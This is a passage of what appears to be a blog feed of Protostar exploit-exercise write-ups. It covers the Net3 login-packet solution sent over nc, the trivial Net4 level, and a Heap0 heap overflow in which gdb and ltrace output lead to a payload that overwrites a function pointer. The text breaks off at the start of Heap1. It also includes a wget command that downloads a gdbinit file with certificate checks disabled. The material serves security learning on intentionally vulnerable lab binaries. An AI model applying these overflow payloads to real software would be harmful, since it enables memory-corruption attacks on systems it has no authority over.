</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">resource</span><span class="p">);</span>
</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">username</span><span class="p">);</span>
</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">password</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="o">!</span> <span class="n">success</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">send_string</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">byte</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">string</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">iovec</span> <span class="n">v</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">u_int16_t</span> <span class="n">len</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">expected</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">len</span> <span class="o">=</span> <span class="n">ntohs</span><span class="p">(</span><span class="mi">1</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">string</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">;</span>
</span><span class='line'>  <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">len</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">byte</span><span class="p">;</span>
</span><span class='line'>  <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="n">string</span><span class="p">;</span>
</span><span class='line'>  <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">string</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">expected</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">len</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">string</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">writev</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">v</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span> <span class="o">!=</span> <span class="n">expected</span><span class="p">)</span> <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;failed to write correct amount of bytes&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">run</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">u_int16_t</span> <span class="n">len</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">loggedin</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">len</span><span class="p">));</span>
</span><span class='line'>  <span class="n">len</span> <span class="o">=</span> <span class="n">ntohs</span><span class="p">(</span><span class="n">len</span><span class="p">);</span>
</span><span class='line'>  <span class="n">buffer</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">len</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="o">!</span> <span class="n">buffer</span><span class="p">)</span> <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;malloc failure for %d bytes&quot;</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">switch</span><span class="p">(</span><span class="n">buffer</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">case</span> <span class="mi">23</span><span class="o">:</span>
</span><span class='line'>          <span class="n">loggedin</span> <span class="o">=</span> <span class="n">login</span><span class="p">(</span><span class="n">buffer</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">len</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>          <span class="n">send_string</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">33</span><span class="p">,</span> <span class="n">loggedin</span> <span class="o">?</span> <span class="s">&quot;successful&quot;</span> <span class="o">:</span> <span class="s">&quot;failed&quot;</span><span class="p">);</span>
</span><span class='line'>          <span class="k">break</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">default</span><span class="o">:</span>
</span><span class='line'>          <span class="n">send_string</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="s">&quot;what you talkin about willis?&quot;</span><span class="p">);</span>
</span><span class='line'>          <span class="k">break</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">username</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">srandom</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">run</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>After a few tries, we got:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/tmp$ ruby -e 'print [30].pack("n") + 23.chr + "\x05" + "net3\x00" + "\x0d" +"awesomesauce\x00" + "\x09" + "password\x00"' | ltrace -f ./net3-modified 
</span><span class='line'>[pid 27179] __libc_start_main(0x804895c, 1, 0xbffff874, 0x80489a0, 0x8048990 &lt;unfinished ...>
</span><span class='line'>[pid 27179] time(NULL)                                                                                                        = 1435334239
</span><span class='line'>[pid 27179] srandom(1435334239)                                                                 = &lt;void>
</span><span class='line'>[pid 27179] read(0, "", 2)                                                                      = 2
</span><span class='line'>[pid 27179] ntohs(7680)                                                                         = 30
</span><span class='line'>[pid 27179] malloc(30)                                                                          = 0x0804a008
</span><span class='line'>[pid 27179] read(0, "\027\005net3", 30)                                                         = 30
</span><span class='line'>[pid 27179] printf("%d &lt; %d\n", 5, 295 &lt; 29
</span><span class='line'>)                                                                                        = 7
</span><span class='line'>[pid 27179] malloc(5)                                                                           = 0x0804a030
</span><span class='line'>[pid 27179] strcpy(0x0804a030, "net3")                                                          = 0x0804a030
</span><span class='line'>[pid 27179] printf("%d &lt; %d\n", 13, 2313 &lt; 23
</span><span class='line'>)                                                                                       = 8
</span><span class='line'>[pid 27179] malloc(13)                                                                          = 0x0804a040
</span><span class='line'>[pid 27179] strcpy(0x0804a040, "awesomesauce")                                                  = 0x0804a040
</span><span class='line'>[pid 27179] printf("%d &lt; %d\n", 9, 99 &lt; 9
</span><span class='line'>)                                                                                         = 6
</span><span class='line'>[pid 27179] malloc(9)                                                                           = 0x0804a058
</span><span class='line'>[pid 27179] strcpy(0x0804a058, "password")                                                      = 0x0804a058
</span><span class='line'>[pid 27179] strcmp("net3", "net3")                                                              = 0
</span><span class='line'>[pid 27179] strcmp("awesomesauce", "awesomesauce")                                              = 0
</span><span class='line'>[pid 27179] strcmp("password", "password")                                                      = 0
</span><span class='line'>[pid 27179] printf("success: %d\n", 0success: 0
</span><span class='line'>)                                                                                        = 11
</span><span class='line'>[pid 27179] free(0x0804a030)                                                                    = &lt;void>
</span><span class='line'>[pid 27179] free(0x0804a040)                                                                    = &lt;void>
</span><span class='line'>[pid 27179] free(0x0804a058)                                                                    = &lt;void>
</span><span class='line'>[pid 27179] strlen("successful")                                                                = 10
</span><span class='line'>[pid 27179] ntohs(11)                                                                           = 2816
</span><span class='line'>[pid 27179] strlen("successful")                                                                = 10
</span><span class='line'>[pid 27179] strlen("successful")                                                                = 10
</span><span class='line'>[pid 27179] writev(1, 0xbffff744, 3, 0xb7f06b2c, 30
</span><span class='line'>                                                   !successful)                          = 13
</span><span class='line'>[pid 27179] +++ exited (status 13) +++</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/tmp$ ruby -e 'print [30].pack("n") + 23.chr + "\x05" + "net3\x00" + "\x0d" +"awesomesauce\x00" + "\x09" + "password\x00"' | ./net3-modified 
</span><span class='line'>5 &lt; 29
</span><span class='line'>13 &lt; 23
</span><span class='line'>9 &lt; 9
</span><span class='line'>success: 0
</span><span class='line'>
</span><span class='line'>!successful</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/tmp$ ruby -e 'print [30].pack("n") + 23.chr + "\x05" + "net3\x00" + "\x0d" +"awesomesauce\x00" + "\x09" + "password"' | nc 0 2996
</span><span class='line'>!successful</span></code></pre></td></tr></table></div></figure>


<h2>Protostar Net4</h2>

<p>This level has only the binary without description, but after disassembling we realize, that there is nothing to solve:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0804975a &lt;run>:
</span><span class='line'> 804975a:       55                      push   ebp
</span><span class='line'> 804975b:       89 e5                   mov    ebp,esp
</span><span class='line'> 804975d:       5d                      pop    ebp
</span><span class='line'> 804975e:       c3                      ret</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Exploit-Exercises: Protostar (Heap Levels)]]></title>
    <link href="http://73696e65.github.io/blog/2015/07/04/exploit-exercises-protostar-heap-levels/"/>
    <updated>2015-07-04T09:29:50+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/07/04/exploit-exercises-protostar-heap-levels</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/">Exploit-Exercises: Protostar (v2)</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ wget https://raw.githubusercontent.com/73696e65/gdbinit/master/gdb_init.txt --no-check-certificate -O ~/.gdbinit -q</span></code></pre></td></tr></table></div></figure>


<h2>Protostar Heap0</h2>

<figure class='code'><figcaption><span>heap0.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">data</span> <span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
</span><span class='line'><span class="p">};</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">fp</span> <span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">fp</span><span class="p">)();</span>
</span><span class='line'><span class="p">};</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">winner</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;level passed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">nowinner</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;level has not been passed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">data</span> <span class="o">*</span><span class="n">d</span><span class="p">;</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">fp</span> <span class="o">*</span><span class="n">f</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">d</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">data</span><span class="p">));</span>
</span><span class='line'>  <span class="n">f</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">fp</span><span class="p">));</span>
</span><span class='line'>  <span class="n">f</span><span class="o">-&gt;</span><span class="n">fp</span> <span class="o">=</span> <span class="n">nowinner</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;data is at %p, fp is at %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">f</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">d</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">f</span><span class="o">-&gt;</span><span class="n">fp</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ gdb -q /opt/protostar/bin/heap0 
</span><span class='line'>Really redefine built-in command "frame"? (y or n) [answered Y; input not from terminal]
</span><span class='line'>Really redefine built-in command "thread"? (y or n) [answered Y; input not from terminal]
</span><span class='line'>Really redefine built-in command "start"? (y or n) [answered Y; input not from terminal]
</span><span class='line'>Reading symbols from /opt/protostar/bin/heap0...done.
</span><span class='line'>
</span><span class='line'>gdb> r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
</span><span class='line'>data is at 0x804a008, fp is at 0x804a050
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>_______________________________________________________________________________
</span><span class='line'>     eax:41346341 ebx:B7FD7FF4  ecx:00000000  edx:00000065     eflags:00210246
</span><span class='line'>     esi:00000000 edi:00000000  esp:BFFFF70C  ebp:BFFFF738     eip:41346341
</span><span class='line'>     cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t s Z a P c 
</span><span class='line'>[007B:BFFFF70C]---------------------------------------------------------[stack]
</span><span class='line'>BFFFF73C : 76 DC EA B7  02 00 00 00 - E4 F7 FF BF  F0 F7 FF BF v...............
</span><span class='line'>BFFFF72C : 50 A0 04 08  20 85 04 08 - 00 00 00 00  B8 F7 FF BF P... ...........
</span><span class='line'>BFFFF71C : 38 F7 FF BF  65 63 EC B7 - 40 10 FF B7  08 A0 04 08 8...ec..@.......
</span><span class='line'>BFFFF70C : FF 84 04 08  08 A0 04 08 - 1D F9 FF BF  50 A0 04 08 ............P...
</span><span class='line'>[007B:41346341]---------------------------------------------------------[ data]
</span><span class='line'>41346341 : Error while running hook_stop:
</span><span class='line'>Cannot access memory at address 0x41346341
</span><span class='line'>0x41346341 in ?? ()</span></code></pre></td></tr></table></div></figure>


<p><code>0x41346341</code> represents the offset 72, also <code>0x804a050 - 0x804a008 = 72</code>. So we
write 64B to <code>d-&gt;name</code> and after another 8B, there is the address of <code>fp</code>.</p>

<p>To verify our statement, we use ltrace and gdb:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ ltrace /opt/protostar/bin/heap0 1337
</span><span class='line'>__libc_start_main(0x804848c, 2, 0xbffff844, 0x8048520, 0x8048510 &lt;unfinished ...>
</span><span class='line'>malloc(64)                                                      = 0x0804a008
</span><span class='line'>malloc(4)                                                       = 0x0804a050
</span><span class='line'>printf("data is at %p, fp is at %p\n", 0x804a008, 0x804a050data is at 0x804a008, f
</span><span class='line'>)                                                                  = 41
</span><span class='line'>strcpy(0x0804a008, "1337")                                      = 0x0804a008
</span><span class='line'>puts("level has not been passed"level has not been passed
</span><span class='line'>)    = 26
</span><span class='line'>+++ exited (status 26) +++</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ gdb -q /opt/protostar/bin/heap0 
</span><span class='line'>Really redefine built-in command "frame"? (y or n) [answered Y; input not from terminal]
</span><span class='line'>Really redefine built-in command "thread"? (y or n) [answered Y; input not from terminal]
</span><span class='line'>Really redefine built-in command "start"? (y or n) [answered Y; input not from terminal]
</span><span class='line'>Reading symbols from /opt/protostar/bin/heap0...done.
</span><span class='line'>
</span><span class='line'>gdb> b *0x80484ff
</span><span class='line'>Breakpoint 1 at 0x80484ff: file heap0/heap0.c, line 40.
</span><span class='line'>
</span><span class='line'>gdb> r $(ruby -e 'print "X" * 64')
</span><span class='line'>data is at 0x804a008, fp is at 0x804a050
</span><span class='line'>level has not been passed
</span><span class='line'>_______________________________________________________________________________
</span><span class='line'>     eax:0000001A ebx:B7FD7FF4  ecx:B7FD84C0  edx:B7FD9340     eflags:00200246
</span><span class='line'>     esi:00000000 edi:00000000  esp:BFFFF730  ebp:BFFFF758     eip:080484FF
</span><span class='line'>     cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t s Z a P c 
</span><span class='line'>[007B:BFFFF730]---------------------------------------------------------[stack]
</span><span class='line'>BFFFF760 : 02 00 00 00  04 F8 FF BF - 10 F8 FF BF  48 18 FE B7 ............H...
</span><span class='line'>BFFFF750 : 20 85 04 08  00 00 00 00 - D8 F7 FF BF  76 DC EA B7  ...........v...
</span><span class='line'>BFFFF740 : 65 63 EC B7  40 10 FF B7 - 08 A0 04 08  50 A0 04 08 ec..@.......P...
</span><span class='line'>BFFFF730 : 08 A0 04 08  41 F9 FF BF - 50 A0 04 08  58 F7 FF BF ....A...P...X...
</span><span class='line'>[007B:BFFFF730]---------------------------------------------------------[ data]
</span><span class='line'>BFFFF730 : 08 A0 04 08  41 F9 FF BF - 50 A0 04 08  58 F7 FF BF ....A...P...X...
</span><span class='line'>BFFFF740 : 65 63 EC B7  40 10 FF B7 - 08 A0 04 08  50 A0 04 08 ec..@.......P...
</span><span class='line'>[0073:080484FF]---------------------------------------------------------[ code]
</span><span class='line'>0x80484ff &lt;main+115>:  leave  
</span><span class='line'>0x8048500 &lt;main+116>:  ret    
</span><span class='line'>0x8048501:    nop
</span><span class='line'>0x8048502:    nop
</span><span class='line'>0x8048503:    nop
</span><span class='line'>0x8048504:    nop
</span><span class='line'>------------------------------------------------------------------------------
</span><span class='line'>
</span><span class='line'>Breakpoint 1, main (argc=0x2, argv=0xbffff804) at heap0/heap0.c:40
</span><span class='line'>40    heap0/heap0.c: No such file or directory.
</span><span class='line'>  in heap0/heap0.c
</span><span class='line'>
</span><span class='line'>gdb> x /25x 0x0804a000
</span><span class='line'>0x804a000:    0x00000000  0x00000049  0x58585858  0x58585858
</span><span class='line'>0x804a010:    0x58585858  0x58585858  0x58585858  0x58585858
</span><span class='line'>0x804a020:    0x58585858  0x58585858  0x58585858  0x58585858
</span><span class='line'>0x804a030:    0x58585858  0x58585858  0x58585858  0x58585858
</span><span class='line'>0x804a040:    0x58585858  0x58585858  0x00000000  0x00000011
</span><span class='line'>0x804a050:    0x08048478  0x00000000  0x00000000  0x00020fa9
</span><span class='line'>0x804a060:    0x00000000</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(08) 0x0804a000: d-control
</span><span class='line'>(64) 0x0804a008: d-name
</span><span class='line'>
</span><span class='line'>(08) 0x0804a048: f-control
</span><span class='line'>(04) 0x0804a050: f-fp</span></code></pre></td></tr></table></div></figure>


<p>We set <code>fp</code> to <code>winner()</code> symbol:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ nm /opt/protostar/bin/heap0 | grep winner
</span><span class='line'>08048478 T nowinner
</span><span class='line'>08048464 T winner
</span><span class='line'>
</span><span class='line'>user@protostar:~$ /opt/protostar/bin/heap0 $(ruby -e 'print "X"*72 + [0x08048464].pack("V")')
</span><span class='line'>data is at 0x804a008, fp is at 0x804a050
</span><span class='line'>level passed</span></code></pre></td></tr></table></div></figure>


<h2>Protostar Heap1</h2>

<figure class='code'><figcaption><span>heap1.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'>
